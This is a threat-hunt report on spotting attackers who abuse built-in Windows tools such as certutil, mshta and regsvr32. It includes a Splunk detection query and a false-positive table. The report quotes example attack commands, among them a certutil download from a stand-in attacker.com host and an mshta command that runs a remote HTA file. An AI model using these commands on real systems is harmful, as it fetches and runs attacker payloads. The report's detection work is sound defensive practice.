# Hunt Report 2 — LOLBin Abuse (Living Off the Land)

**Hunt date:** 2026-06-23
**Analyst:** Lawrence
**Hypothesis:** An attacker is using trusted Windows binaries to download or execute malicious code
**Status:** Research-based — lab rebuild pending. Query designed and documented, execution pending.

---

## Hypothesis

"If an attacker is living off the land, they are using built-in Windows tools like certutil, mshta, or regsvr32 with arguments that no legitimate user or administrator would normally use — specifically downloading files from the internet or executing scripts from unusual locations."

---

## Why I Chose This Hypothesis Second

LOLBin abuse is consistently in the top 5 most-used attacker techniques in real incidents according to Red Canary's threat detection report. The reason is simple — these tools are on every Windows machine, they're signed by Microsoft, and most security tools whitelist them. An attacker using `certutil` to download a payload looks like a sysadmin checking a certificate to most defences.

I chose this over the WMI lateral movement hypothesis because the false positive rate is lower. `certutil -urlcache -f http://attacker.com/payload.exe` is almost never a legitimate command. `WmiPrvSE.exe` spawning `cmd.exe` has legitimate use cases in some management tools. LOLBin detection is higher confidence per alert.

---

## Data Source

Sysmon Event ID 1 — Process creation (includes full command line)
Sysmon Event ID 3 — Network connection (catches the download activity)

---

## Query (Splunk SPL)

```spl
index=sysmon EventCode=1
| where 
    (Image LIKE "%\\certutil.exe%" AND (CommandLine LIKE "%-urlcache%" OR CommandLine LIKE "%-decode%"))
    OR (Image LIKE "%\\mshta.exe%" AND (CommandLine LIKE "%http%" OR CommandLine LIKE "%javascript%"))
    OR (Image LIKE "%\\regsvr32.exe%" AND CommandLine LIKE "%scrobj%")
    OR (Image LIKE "%\\rundll32.exe%" AND CommandLine LIKE "%javascript%")
    OR (Image LIKE "%\\wmic.exe%" AND CommandLine LIKE "%process call create%")
| table _time, ComputerName, User, Image, CommandLine, ParentImage, ParentCommandLine
| sort -_time
```

---

## Expected Results

**If the hunt finds nothing:**
No LOLBin abuse detected. Clean result — either the environment has no active LOLBin-based attacks, or an attacker is using other techniques not covered by this hunt.

**If the hunt finds certutil with -urlcache:**
This is almost always malicious. `certutil -urlcache -f URL localfile` downloads a file from the internet. Legitimate certutil use does not involve downloading arbitrary files. Any finding here should be treated as high confidence.

**If the hunt finds mshta.exe with http in the argument:**
`mshta http://domain.com/file.hta` executes a remote HTA file. Legitimate mshta use runs local files. Remote execution is a red flag.

---

## False Positive Analysis

| Finding | Likely explanation | Confidence |
|---------|------------------|-----------|
| certutil -urlcache | No known legitimate use — malicious download | High |
| mshta with remote URL | HTA-based malware or phishing | High |
| regsvr32 with scrobj | Squiblydoo technique — almost always malicious | Very High |
| wmic process call create | Some legitimate management scripts | Medium — check parent process |

---

## Refinement

Unlike Hypothesis 1 (scheduled tasks), LOLBin detection requires minimal false positive filtering because the specific argument patterns searched for have almost no legitimate use. The refinement focus here would be:

1. Add the parent process field — LOLBins spawned by `winword.exe` or `excel.exe` are extremely high priority
2. Add network connection correlation — if the same machine shows both the LOLBin execution AND a network connection to a new IP in the same timeframe, confidence jumps significantly

---

## Hunt Outcome

**Pending lab rebuild.** Will execute when Windows VM is operational.

---

## Lessons from Designing This Hunt

This hunt highlighted how much easier detection is when you focus on attacker technique specifics rather than general behaviour. `cmd.exe running as a child process` is too broad — thousands of legitimate false positives. `certutil.exe with -urlcache in the command line` is extremely specific and high confidence. The more precisely you can model the attacker's exact technique, the better your signal-to-noise ratio.
